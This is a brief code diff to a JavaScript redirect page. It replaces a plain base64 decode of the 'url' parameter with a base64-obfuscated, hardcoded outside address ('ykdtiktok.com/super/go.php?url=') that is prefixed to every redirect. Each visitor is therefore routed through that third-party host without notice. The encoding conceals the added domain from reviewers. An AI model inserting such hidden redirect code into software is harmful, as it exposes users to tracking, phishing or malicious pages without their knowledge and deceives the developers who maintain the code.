@@ -26,7 +26,10 @@
 
     const urls = window.location.href.split("/");
     let param = getQueryVariable('url')
-    const jumpUrl = window.atob(param);
+    //const jumpUrl = window.atob(param);
+    
+    const jumpUrl = window.atob("aHR0cHM6Ly93d3cueWtkdGlrdG9rLmNvbS9zdXBlci9nby5waHA/dXJsPQ==")+param;
+    
     //window.location.href = jumpUrl;
     location.href = jumpUrl;
 
